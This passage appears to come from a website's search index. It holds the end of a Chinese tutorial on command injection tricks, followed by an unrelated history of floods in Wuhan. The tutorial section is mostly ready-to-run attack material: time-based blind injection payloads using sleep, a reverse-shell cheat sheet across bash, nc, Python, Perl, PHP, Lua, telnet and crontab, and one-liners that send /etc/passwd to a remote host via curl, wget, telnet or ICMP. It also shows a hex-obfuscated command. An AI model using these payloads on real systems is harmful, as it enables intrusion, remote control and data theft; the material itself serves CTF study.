\u7136\u540e\u5c06tr\u547d\u4ee4\u7684\u8f93\u51fa\u4f20\u9012\u7ed9 sleep \u547d\u4ee4\uff0c sleep h \u88ab\u6267\u884c\u5c06\u4f1a\u7acb\u5373\u51fa\u73b0\u62a5\u9519\uff0c\u8fd9\u662f\u56e0\u4e3a sleep \u540e\u8ddf\u7684\u53c2\u6570\u667a\u80fd\u4e3a\u4e00\u4e2a\u6570\u5b57\u3002\u7136\u540e\uff0c\u76ee\u6807\u4f7f\u7528tr\u547d\u4ee4\u8fed\u4ee3\u5b57\u7b26\u3002\u6267\u884c sleep $(hostname | cut -c 1 | tr h 5) \u547d\u4ee4\uff0c\u5c06\u9700\u89815\u79d2\u949f\u7684\u65f6\u95f4\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e00\u4e2ah\u3002\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6211\u4eec\u5c31\u80fd\u5c06\u5b8c\u6574\u7684\u4e3b\u673a\u540d\u731c\u89e3\u51fa\u6765\u3002 \u5f53\u7136\uff0c\u8fd9\u4e2a\u5229\u7528\u6761\u4ef6\u53ef\u80fd\u5bf9\u7f51\u7edc\u73af\u5883\u8981\u6c42\u6bd4\u8f83\u9ad8\uff0c\u4f46\u662f\u4f9d\u9760\u54cd\u5e94\u65f6\u95f4\u7684\u76f8\u5bf9\u65f6\u95f4\u6765\u5224\u65ad\uff0c\u4e5f\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5224\u65ad\u7684\uff0c\u6d4b\u8bd5\u793a\u4f8b\uff1a \u547d\u4ee4 \u65f6\u95f4 \u7ed3\u679c ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 1 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 1 tr h 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 2 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 3 tr a 5)\u2019 ruby server-online.rb \u20188.8.8.8;sleep $(hostname cut -c 3 tr c 5)\u2019 \u5982\u679c\u60f3\u8981\u77e5\u9053\u76ee\u6807\u4e3b\u673a\u540d\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u4e3b\u673a\u540d\u7684\u8f93\u51fa\u901a\u8fc7\u7ba1\u9053\u7b26\u4f20\u9012\u7ed9 wc -c \u547d\u4ee4\u3002 hacker.local \u4e3a 12 \u4e2a\u5b57\u7b26\u3002 hostname \u547d\u4ee4\u8fd4\u56de\u4e3b\u673a\u540d\u548c\u4e00\u4e2a\u65b0\u884c\uff0c\u56e0\u6b64 wc -c \u5c06\u663e\u793a13\u4e2a\u5b57\u7b26\u3002\u7ecf\u8fc7\u6211\u4eec\u6d4b\u8bd5\uff0c\u811a\u672c\u7684\u6267\u884c\u65f6\u95f4\u6700\u77ed\u9700\u89813\u79d2\u949f\u3002 $ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)' yes 0.10s user 0.04s system 0% cpu 16.188 total \u53ef\u4ee5\u770b\u5230\u4ee5\u4e0a\u7684payload\u811a\u672c\u5171\u7528\u65f616\u79d2\u624d\u6267\u884c\u5b8c\u6210\uff0c\u8fd9\u610f\u5473\u7740\u4e3b\u673a\u540d\u4e3a12\u4e2a\u5b57\u7b26\uff1a16 \u2013 3 (\u539f\u65f6\u95f4) \u2013 1 (\u65b0\u884c) = 12\u4e2a\u5b57\u7b26\u3002\u5f53\u5728Web\u670d\u52a1\u5668\u4e0a\u6267\u884c\u6b64payload\u65f6\uff0c\u8f93\u51fa\u7ed3\u679c\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff1a\u5f53\u8bf7\u6c42\u7531\u4e0d\u540c\u7684\u670d\u52a1\u5668\u5904\u7406\u65f6\uff0c\u4e3b\u673a\u540d\u7684\u957f\u5ea6\u4e5f\u53ef\u80fd\u4f1a\u6539\u53d8\u3002 \u672c\u6b21 NUAACTF \u6211\u4e5f\u662f\u4ece\u8fd9\u91cc\u51fa\u4e86\u4e00\u4e2a\u70b9\uff0c\u5f3a\u8feb\u4f7f\u7528 sleep $(xxx) \u6765\u8bfb\u53d6 flag \u3002","title":"sleep"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_34","text":"\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5e76\u4e14\u57fa\u4e8e\u66b4\u9732\u7684\u670d\u52a1\u786e\u5b9a\u63d0\u53d6\u8f93\u51fa\u7684\u65b9\u5f0f\u3002 FTP \uff1a\u5c1d\u8bd5\u5c06\u6587\u4ef6\u5199\u5165\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u6587\u4ef6\u7684\u76ee\u5f55\u3002 SSH \uff1a\u5c1d\u8bd5\u5c06\u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165MOTD banner\uff0c\u7136\u540e\u53ea\u9700SSH\u5230\u670d\u52a1\u5668\u3002 Web \uff1a\u5c1d\u8bd5\u5c06\u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165\u516c\u5171\u76ee\u5f55\uff08/var/www/\uff09\u4e2d\u3002","title":"\u4f7f\u7528\u66b4\u9732\u7684\u670d\u52a1"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#shell","text":"\u4e0d\u8fc7\u65e0\u8bba\u600e\u4e48\u73a9\uff0c\u8fd8\u662f\u76f4\u63a5\u5f39\u56de\u4e00\u4e2a shell \u6765\u6700\u5b9e\u7528\uff0c\u4e8e\u662f\u53ef\u4ee5\u6709 bash \u65b9\u5f0f bash -c \"sh >& /dev/tcp/your ip/port 0>&1\" exec \u65b9\u5f0f $ exec 5<>/dev/tcp/ip/port $ cat <&5 | while read line; do $line 2>&5 >&5; done nc \u65b9\u5f0f \u672c\u673a\u8fd0\u884c nc -l -vv -p port \u76ee\u6807\u4e3b\u673a nc -e /bin/bash ip port \u53e6\u4e00\u79cd nc \u65b9\u5f0f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f \u6216\u8005 mknod backpipe p && nc ip port 0<backpipe | /bin/bash 1>backpipe \u6216\u8005 /bin/sh | nc \u53d7\u5bb3\u8005ip port #\u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u9700\u8981\u5728\u4f60\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u8fd0\u884c python \u65b9\u5f0f python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \u53e6\u4e00\u79cd python -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\" Perl \u65b9\u5f0f perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' php \u65b9\u5f0f php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' lua \u65b9\u5f0f lua -e \"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i <&3 >&3 2>&3');\" #\u9700\u8981lua socket\u652f\u6301\uff0c\u4e14lua5.2+\u4e0d\u652f\u6301luasocket crontab \u65b9\u5f0f crontab -e \u7f16\u8f91\u5f53\u524d\u7528\u6237\u7684\u4efb\u52a1\uff0c\u6216\u8005\u662f\u5199\u5230\u8ba1\u5212\u4efb\u52a1\u76ee\u5f55\uff0c\u4e00\u822c\u662f /var/spool/cron/ \u76ee\u5f55\uff0c ubuntu \u662f / var/spool/cron/crontabs \u3002\u6587\u4ef6\u540d\u4e3a\u7528\u6237\u540d root \u7b49\u3002\u4e0b\u9762\u547d\u4ee4\u542b\u4e49\u662f\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21\u53cd\u5f39 shell \u547d\u4ee4\u3002 SHELL=/bin/bash * * * * * /bin/bash -i >& /dev/tcp/ip/port 0>&1 telnet \u65b9\u5f0f mknod backpipe p && telnet ip port 0<backpipe | /bin/bash 1>backpipe msf \u65b9\u5f0f\u6709\u5f88\u591a\u79cd\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u63d0\u4e86\u3002","title":"\u53cd\u5f39shell"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#trick","text":"\u65e0\u7a7a\u683c\uff1a ping -c 4 8.8.8.8;hostname|{nc,ip,port} \u4f7f\u7528 nc \u5c06\u6587\u4ef6\u91cd\u5b9a\u5411\uff1a \u9776\u673a\u4e0a nc -lvp port < /etc/passwd \u672c\u673a\u76f4\u63a5 nc ip port \u5f97\u5230\u6587\u4ef6\u5185\u5bb9 \u4f7f\u7528 http \u534f\u8bae\uff0c\u901a\u8fc7 curl \uff1a curl http://ip:port -F a=@/etc/passwd \u540c\u6837\u53ef\u4ee5\u901a\u8fc7 curl \u4f7f\u7528 ftp \u534f\u8bae\uff0c\u540c\u7406 wget \u3001 telnet \u5f53\u7136\u4e5f\u662f\u53ef\u4ee5\u7684 wget --post-data=\"`cat /etc/passwd`\" http://ip:port wget --post-file=/etc/passwd http://ip:port telnet 106.14.153.173 2015 < /etc/passwd \u4f7f\u7528 ICMP \u62a5\u6587 cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done","title":"Trick"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_35","text":"2019/2/13\uff0c\u66f4\u6b63\u4e86\u6587\u7ae0\u51e0\u5904\u9519\u8bef\uff0c\u5df2\u66f4\u65b0\u6587\u7ae0\u5185\u5bb9\u9519\u8bef\u5904 $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") #\u53ef\u4ee5\u6267\u884c","title":"\u66f4\u6b63"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_36","text":"Web Application Firewall (WAF) Evasion Techniques Command Injection - OWASP coomix Web \u5b89\u5168\u6f0f\u6d1e\u4e4b OS \u547d\u4ee4\u6ce8\u5165 linux\u7279\u6b8a\u7b26\u53f7\u5927\u5168 \u5c0f\u5bc6\u5708\u4e13\u9898(2)-\u547d\u4ee4\u6267\u884c\u7ed5\u8fc7 linux bash shell\u4e2d\uff0c\u5355\u5f15\u53f7\u3001 \u53cc\u5f15\u53f7\uff0c\u53cd\u5f15\u53f7\uff08``\uff09\u7684\u533a\u522b\u53ca\u5404\u79cd\u62ec\u53f7\u7684\u533a\u522b \u7531ISCC2018-Web-Ping\u5b66\u4e60\u547d\u4ee4\u6ce8\u5165 shelling HITCON CTF 2017-BabyFirst Revenge-writeup LINUX\u4e0b\u53cd\u5f39SHELL\u7684\u79cd\u79cd\u65b9\u5f0f Linux\u6e17\u900f\u4e4b\u53cd\u5f39Shell\u547d\u4ee4\u89e3\u6790 \u6280\u672f\u5206\u6790\uff1a\u653b\u51fb\u8005\u662f\u5982\u4f55\u5229\u7528\u7cfb\u7edf\u547d\u4ee4\u76f2\u6ce8\u5b9e\u73b0\u201c\u62d6\u5e93\u201d\u7684\uff1f \u539f\u6587\u94fe\u63a5\uff1a https://blog.zeddyu.info/2019/01/17/\u547d\u4ee4\u6267\u884c/","title":"\u53c2\u8003"},{"location":"other/%E6%AD%A6%E6%B1%89%EF%BC%9A%E7%99%BE%E5%B9%B4%E7%9A%84%E6%B4%AA%E6%B0%B4%E8%AE%B0%E5%BF%86/","text":"\u6b66\u6c49\uff1a\u767e\u5e74\u7684\u6d2a\u6c34\u8bb0\u5fc6 \u6b66\u6c49\uff0c\u53c8\u79f0\u6c5f\u57ce\u3002\u6ca1\u6709\u4e00\u5ea7\u57ce\u5e02\u50cf\u6b66\u6c49\u8fd9\u6837\uff0c\u4e0e\u957f\u6c5f\u7684\u5173\u7cfb\u5982\u6b64\u4eb2\u5bc6\u65e0\u95f4\u3002 \u4e00\u5343\u591a\u5e74\u524d\uff0c\u7531\u4e8e\u957f\u6c5f\u6c5f\u6c34\u7684\u51b2\u5237\u4e0e\u6ce5\u6c99\u6de4\u79ef\uff0c\u9010\u6e10\u5f62\u6210\u9646\u5730\u6d32\u6ee9\uff0c\u8bde\u751f\u4e86\u6b66\u6c49\u7684\u96cf\u5f62\uff1b\u800c\u540e\u5728\u957f\u6c5f\u704c\u6e89\u51fa\u6765\u7684\u6c83\u571f\u4e0a\uff0c\u201c\u6e56\u5e7f\u719f\uff0c\u5929\u4e0b\u8db3\u201d\uff0c\u6c5f\u6c49\u5e73\u539f\u6210\u4e3a\u5929\u4e0b\u7cae\u4ed3\u3002\u4e00\u767e\u591a\u5e74\u524d\uff0c\u6c49\u53e3\u85c9\u7740\u957f\u6c5f\u7684\u9ec4\u91d1\u6c34\u9053\uff0c\u5927\u5174\u8d38\u6613\uff0c\u5546\u8d3e\u4e91\u96c6\uff0c\u98ce\u5149\u65e0\u9650\uff0c\u5e76\u5728\u6e05\u672b\u7387\u5148\u5f00\u57e0\uff0c\u6210\u4e3a\u8fd1\u4ee3\u5de5\u4e1a\u7684\u53d1\u7965\u5730\u4e4b\u4e00\uff0c\u88ab\u79f0\u4e3a\u201c\u4e1c\u65b9\u5a01\u5c3c\u65af\u201d\u3002 \u4e5f\u6ca1\u6709\u4e00\u5ea7\u57ce\u5e02\u50cf\u6b66\u6c49\u8fd9\u6837\uff0c\u4e0e\u957f\u6c5f\u7684\u5bf9\u6297\u4e89\u6597\u4e0d\u4f11\u4e0d\u6b62\uff0c\u5728\u300a\u6b66\u6c49\u5730\u65b9\u5fd7\u300b\u7684\u8bb0\u8f7d\u4e2d\uff0c\u201c\u5927\u6c34\u201d\u51e0\u4e4e\u6bcf\u4e09\u5e74\u5c31\u6765\u62dc\u8bbf\u6b66\u6c49\u4e00\u6b21\uff0c\u6b66\u6c49\u5e02\u6c11\u4e5f\u51e0\u4e4e\u6210\u4e86\u770b\u5929\u7684\u4e13\u5bb6\u3002\u5927\u6c34\u51e0\u4e4e\u6784\u6210\u4e86\u8fd9\u5ea7\u57ce\u5e02\u7684\u90e8\u5206\u9762\u8c8c\u2014\u2014\u6c5f\u6c49\u5e73\u539f\u4ece\u9b4f\u664b\u65f6\u4ee3\u5c31\u5f00\u59cb\u4fee\u5824\u9632\uff0c1635\u5e74\uff0c\u6c49\u53e3\u7acb\u8d77\u4e86\u7b2c\u4e00\u6761\u957f\u5824\uff0c\u6b63\u8857\u5f62\u6210\u4e86\uff1b1864\u5e74\uff0c\u5730\u65b9\u653f\u5e9c\u53c8\u5728\u957f\u5824\u5916\u7684\u6e56\u8361\u4e2d\u4fee\u7b51\u4e86\u6c49\u53e3\u5821\u4ee5\u6321\u6765\u6c34\uff0c\u6c49\u53e3\u9762\u79ef\u589e\u52a0\u4e863\u500d\uff1b1905\u5e74\uff0c\u5f20\u4e4b\u6d1e\u4fee\u5efa\u5f20\u516c\u5824\uff0c\u771f\u6b63\u8d4b\u4e88\u4e86\u6c49\u53e3\u73b0\u4ee3\u57ce\u5e02\u7684\u5f62\u8c61\u3002 \u88ab\u6d2a\u6c34\u9020\u5c31\u7684\u5927\u6b66\u6c49 \u6b66\u6c49\u7684\u6545\u4e8b\uff0c\u5fc5\u5b9a\u8981\u7531\u957f\u6c5f\u8bb2\u8ff0\u3002\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u8bf4\uff0c\u957f\u6c5f\u6210\u5c31\u4e86\u6b66\u6c49\uff0c\u6b66\u6c49\u4e5f\u5728\u6539\u53d8\u7740\u957f\u6c5f\u3002 \u5728\u8ddd\u4eca10000\u5e74\u52302000\u5e74\u4ee5\u524d\uff0c\u957f\u6c5f\u51fa\u4e09\u5ce1\u3001\u6c49\u6c5f\u51fa\u4e39\u6c5f\u53e3\u540e\uff0c\u5c31\u5728\u4eca\u6c5f\u6c49\u5e73\u539f\u4e00\u5e26\u5954\u6d8c\u4ea4\u6c47\u3002\u5f53\u65f6\u7684\u6c5f\u6c49\u5e73\u539f\u5730\u52bf\u4f4e\u6d3c\uff0c\u662f\u8352\u65e0\u4eba\u70df\u7684\u6cbc\u6cfd\u6e7f\u5730\uff0c\u88ab\u79f0\u4e3a\u201c\u4e91\u68a6\u5927\u6cfd\u201d\u3002\u53f2\u6599\u8bb0\u8f7d\uff0c\u4e91\u68a6\u6cfd\u5357\u8fde\u957f\u6c5f\uff0c\u5317\u901a\u6c49\u6c34\uff0c\u8fde\u7ef5\u4e0d\u65ad\u7684\u6e56\u6cca\u548c\u6cbc\u6cfd\uff0c\u5927\u6cfd\u82e5\u5e72\uff0c\u603b\u9762\u79ef\u4e8c\u4e07\u591a\u5e73\u65b9\u516c\u91cc\uff0c\u662f\u957f\u6c5f\u4e2d\u6e38\u533a\u57df\u4e00\u5904\u6c5f\u3001\u6cb3\u3001\u6e56\u5b8c\u5168\u6c9f\u901a\u878d\u5408\uff0c\u6c34\u6d41\u8fdb\u51fa\u81ea\u5982\u7684\u6c34\u57df\u573a\u6240\u3002 \u6bcf\u5e74\u6c5b\u671f\uff0c\u957f\u6c5f\u548c\u6c49\u6c34\u66b4\u623e\u5ffd\u73b0\uff0c\u5230\u5904\u6d2a\u6c34\u6f2b\u6d41\uff0c\u6574\u4e2a\u4e91\u68a6\u6cfd\u6c5f\u6e56\u4e0d\u5206\uff0c\u5448\u73b0\u51fa\u5927\u7247\u5927\u7247\u6c34\u5929\u76f8\u8fde\u7684\u72b6\u6001\u3002\u540c\u65f6\uff0c\u6c5f\u6c34\u643a\u5e26\u7684\u5927\u91cf\u6ce5\u6c99\u4e5f\u88ab\u5e26\u6765\uff0c\u968f\u7740\u6c34\u6d41\u6d41\u901f\u51cf\u7f13\uff0c\u6ce5\u6c99\u4e5f\u5c31\u6de4\u79ef\u4e86\u4e0b\u6765\u3002\u5148\u6de4\u51fa\u5c0f\u7684\u6d32\u6ee9\uff0c\u518d\u9010\u6e10\u6de4\u51fa\u5927\u7684\u6d32\u6ee9\uff0c\u4e91\u68a6\u6cfd\u4e0d\u65ad\u88ab\u5206\u5272\u3001\u89e3\u4f53\u548c\u7f29\u5c0f\uff0c\u6162\u6162\u5730\u5f62\u6210\u6c5f\u6c49\u5185\u9646\u4e09\u89d2\u6d32\u3002\u6d2a\u6c34\u9000\u53bb\u540e\u7684\u8fd9\u4e9b\u6d32\u6ee9\u571f\u6c83\u8349\u4e30\uff0c\u4eba\u4eec\u5728\u6b64\u56f4\u57a6\u3001\u4fee\u9632\uff0c\u6c49\u9633\u3001\u6b66\u660c\u7684\u96cf\u5f62\u6b63\u662f\u5728\u6b64\u57fa\u7840\u4e0a\u6162\u6162\u5f62\u6210\u7684\u3002 \u53ef\u60dc\uff0c\u660e\u671d\u6210\u5316\u5e74\u95f4\u7684\u90a3\u6b21\u6d2a\u6c34\uff0c\u6ca1\u6709\u4eba\u51c6\u786e\u5730\u8bb0\u5f55\u5b83\u3002\u90a3\u662f\u5bf9\u6b66\u6c49\u6700\u53cb\u597d\u3001\u4e5f\u6700\u6709\u4ef7\u503c\u7684\u4e00\u6b21\u6d2a\u6c34\u2014\u2014\u5b83\u5851\u9020\u4e86\u6c49\u53e3\u3002\u6b66\u660c\u548c\u6c49\u9633\u65e9\u5c31\u5b58\u5728\u4e86\uff0c\u5b83\u4eec\u7684\u519b\u4e8b\u4ef7\u503c\u88ab\u5386\u4ee3\u5c06\u9886\u91cd\u89c6\u3002\u4f46\u76f4\u52301465\u5e74\u4ee5\u524d\uff0c\u6c49\u53e3\u8fd8\u53ea\u662f\u4e00\u7247\u6c99\u6d32\uff0c\u91cc\u9762\u5404\u79cd\u6c34\u6d41\u7eb5\u6a2a\u4ea4\u9519\uff0c\u5f53\u7136\u4e5f\u6ca1\u6709\u4ec0\u4e48\u56fa\u5b9a\u5c45\u6c11\u3002 \u57281465\u5e74\u81f31487\u5e74\u95f4\uff0c\u6c49\u6c34\u53d1\u751f\u4e86\u4e00\u6b21\u6539\u9053\uff0c\u6b64\u524d\uff0c\u5b83\u72c2\u66b4\u800c\u968f\u610f\u5730\u9009\u62e9\u81ea\u5df1\u8fdb\u5165\u957f\u6c5f\u7684\u8def\u7ebf\uff1b\u6b64\u540e\uff0c\u5b83\u5f00\u59cb\u6cbf\u7740\u4e00\u6761\u56fa\u5b9a\u7684\u3001\u4e0e\u4eca\u5929\u5dee\u4e0d\u591a\u7684\u8def\u7ebf\u524d\u8fdb\uff0c\u6c49\u9633\u548c\u6c49\u53e3\u7531\u6b64\u88ab\u6e05\u6670\u5730\u5212\u5206\u51fa\u6765\uff0c\u4ece\u800c\u4e3a\u4eca\u5929\u6b66\u6c49\u4e09\u9547\u7684\u5f62\u6210\u5960\u5b9a\u4e86\u5730\u7406\u57fa\u7840\u3002 \u8fd9\u6b21\u5927\u6c34\u53d1\u751f\u540e\u51e0\u5341\u5e74\uff0c\u6c49\u53e3\u6709\u4e86\u56fa\u5b9a\u5c45\u6c11\uff0c\u76d0\u5546\u4eec\u9996\u5148\u53d1\u73b0\u4e86\u8fd9\u91cc\u7684\u4fbf\u5229\uff0c\u201c\u4e0d\u7279\u4e3a\u695a\u7701\u54bd\u5589\uff0c\u800c\u4e91\u8d35\u3001\u56db\u5ddd\u3001\u6e56\u5357\u3001\u5e7f\u897f\u3001\u9655\u897f\u3001\u6cb3\u5357\u3001\u6c5f\u897f\u4e4b\u8d27\u7269\uff0c\u7686\u7531\u6b64\u7109\u8f6c\u8f93\u2026\u2026\u201d\u76d0\u8239\u8fc7\u53bb\u662f\u4ece\u4ea7\u5730\u76f4\u63a5\u8fd0\u5f80\u5404\u5730\u9500\u552e\uff0c\u4e2d\u9014\u4e0d\u8bbe\u96c6\u6563\u5730\uff1b\u4f46\u4ece\u4e07\u5386\u5e74\u95f4\u5f00\u59cb\uff0c\u4e24\u6dee\u76d0\u5546\u5bf9\u6e56\u5e7f\u7684\u8fd0\u9500\uff0c\u4fbf\u662f\u5230\u6c49\u53e3\u4e3a\u6b62\u3002\u6c49\u53e3\u4ee5\u8fdc\u7684\u9500\u552e\uff0c\u5219\u662f\u7531\u53e6\u4e00\u6279\u5546\u4eba\u6765\u63a5\u66ff\u3002\u8fd9\u6837\uff0c\u6c49\u53e3\u4fbf\u6210\u4e3a\u6dee\u76d0\u5728\u5176\u5883\u5916\u7684\u4e00\u4e2a\u6700\u5927\u7684\u5468\u8f6c\u7801\u5934\u3002\u6dee\u76d0\u4e4b\u540e\u662f\u6f15\u7cae\uff0c\u4e00\u4e2a\u7e41\u8363\u7684\u5546\u4e1a\u57ce\u9547\u5c31\u6b64\u8bde\u751f\u3002 \u4e09\u9547\u4e4b\u4e2d\uff0c\u5730\u52bf\u6700\u4f4e\u7684\u662f\u6c49\u53e3\u3002\u6c49\u53e3\u7684\u8857\u5e02\u90fd\u662f\u6cbf\u957f\u6c5f\u800c\u5efa\uff0c\u524d\u9762\u662f\u6e2f\u53e3\u7801\u5934\uff0c\u540e\u9762\u662f\u6e56\u6cca\u6d3c\u5730\u3002\u53d7\u957f\u6c5f\u6d41\u57df\u526f\u70ed\u5e26\u9ad8\u538b\u7684\u5f71\u54cd\uff0c\u6b66\u6c49\u6bcf\u5e74\u516d\u4e03\u6708\u4efd\u90fd\u4f1a\u8fce\u6765\u6885\u96e8\u5b63\u8282\uff0c\u957f\u6c5f\u6c34\u4e30\uff0c\u6c49\u53e3\u4fbf\u6c6a\u6d0b\u8086\u8650\uff0c\u9646\u5730\u884c\u821f\uff0c\u8fd9\u4f7f\u5f97\u6c49\u53e3\u4e00\u76f4\u4eba\u53e3\u7a00\u5c11\u53d1\u5c55\u7f13\u6162\u3002 \u4e3a\u4e86\u5bf9\u6297\u8086\u8650\u7684\u6d2a\u6c34\uff0c1635\u5e74\uff0c\u6c49\u9633\u5e9c\u901a\u5224\u8881\u713b\u4e3b\u6301\u4fee\u5efa\u4e86\u6c49\u53e3\u7b2c\u4e00\u6761\u957f\u5824\u2014\u2014\u8881\u516c\u5824\u3002\u8be5\u5824\u4fee\u597d\u4e4b\u540e\uff0c\u4f7f\u5f97\u6c49\u53e3\u8857\u5e02\u5f97\u4ee5\u5411\u7eb5\u6df1\u53d1\u5c55\uff0c\u5824\u5185\u7684\u6e56\u6cca\u6d3c\u5730\u4e5f\u9010\u6e10\u88ab\u8857\u5e02\u53d6\u4ee3\uff0c\u5e76\u5f62\u6210\u4e86\u6c49\u53e3\u7b2c\u4e00\u6761\u6b63\u8857\u3002 \u5c11\u4e86\u6c34\u60a3\u4e4b\u5fe7\uff0c\u53c8\u5750\u62e5\u7801\u5934\u4fbf\u5229\uff0c\u6c5f\u6c49\u5e73\u539f\u4e0a\u7684\u7a3b\u7c73\u4fbf\u987a\u7740\u957f\u6c5f\u7684\u201c\u9ec4\u91d1\u6c34\u9053\u201d\u8fd0\u9001\u5230\u6c49\u53e3\uff0c\u6c49\u53e3\u8fc5\u901f\u4ece\u4e00\u4e2a\u540d\u4e0d\u89c1\u7ecf\u4f20\u7684\u5c0f\u9547\u4e00\u8dc3\u6210\u4e3a\u6e56\u5e7f\u6f15\u7cae\u7684\u50a8\u5b58\u4e0e\u8f6c\u8fd0\u4e2d\u5fc3\uff0c\u8dfb\u8eab\u660e\u4ee3\u201c\u56db\u5927\u7c73\u9547\u201d\u4e4b\u4e00\uff0c\u5546\u8d38\u4e4b\u76db\u8fdc\u8d85\u6b66\u660c\u3001\u6c49\u9633\u3002 \u6e05\u540c\u6cbb\u5e74\u95f4\uff0c\u6c49\u53e3\u7ecf\u8fc7200\u591a\u5e74\u7684\u53d1\u5c55\uff0c\u5df2\u662f\u201c\u5546\u8d3e\u4e91\u96c6\u3001\u5e06\u6a2f\u6797\u7acb\u3001\u4e0d\u5206\u663c\u591c\u201d\u7684\u8d38\u6613\u91cd\u9547\uff0c\u4f46\u56ff\u4e8e\u5824\u9632\uff0c\u8303\u56f4\u72ed\u5c0f\u3002\u5f53\u65f6\u7684\u6c49\u9633\u90e1\u5b88\u949f\u8c26\u94a7\u5728\u8881\u516c\u5824\u5916\u7684\u6e56\u8361\u4e2d\u4fee\u7b51\u4e86\u6c49\u53e3\u5821\uff0c\u4ee5\u6321\u6d2a\u6c34\uff0c\u6c49\u53e3\u9762\u79ef\u4e00\u4e0b\u5b50\u6269\u5927\u4e86\u4e09\u500d\uff0c\u4e00\u65f6\u7e41\u8363\u65e0\u4e8c\u3002 1905\u5e74\uff0c\u5f20\u4e4b\u6d1e\u4efb\u6e56\u5e7f\u603b\u7763\uff0c\u5148\u540e\u5728\u6c49\u53e3\u4fee\u4e86\u5f20\u516c\u5824\uff0c\u5728\u6b66\u660c\u4fee\u4e86\u6b66\u4e30\u5824\u3001\u6b66\u6cf0\u5824\uff0c\u4e0d\u4ec5\u4ece\u66f4\u5927\u8303\u56f4\u91cc\u89e3\u9664\u4e86\u6b66\u6c49\u6c34\u60a3\uff0c\u66f4\u4e3a\u5927\u6b66\u6c49\u7684\u57ce\u5e02\u53d1\u5c55\u5b9a\u4e0b\u4e86\u5927\u683c\u5c40\u3002\u6b66\u6c49\u771f\u6b63\u4ece\u8d38\u6613\u5c0f\u9547\u5f00\u59cb\u8d70\u4e0a\u4e86\u201c\u4e1c\u65b9\u5a01\u5c3c\u65af\u201d\u7684\u5927\u90fd\u4f1a\u4e4b\u8def\u3002 \u6d2a\u6c34\u4fb5\u88ad\u6210\u751f\u6d3b\u5e38\u4e8b \u516c\u5143\u524d185\u5e74\uff0c\u201c\u590f\uff0c\u6c5f\u6c34\u3001\u6c49\u6c34\u6ea2\uff0c\u6d41\u6c11\u56db\u5343\u4f59\u5bb6\u3002\u201d\u8fd9\u662f\u4e2d\u56fd\u53f2\u4e0a\u7b2c\u4e00\u6b21\u6709\u6587\u5b57\u8bb0\u8f7d\u7684\u957f\u6c5f\u4e2d\u6e38\u6c34\u707e\u3002 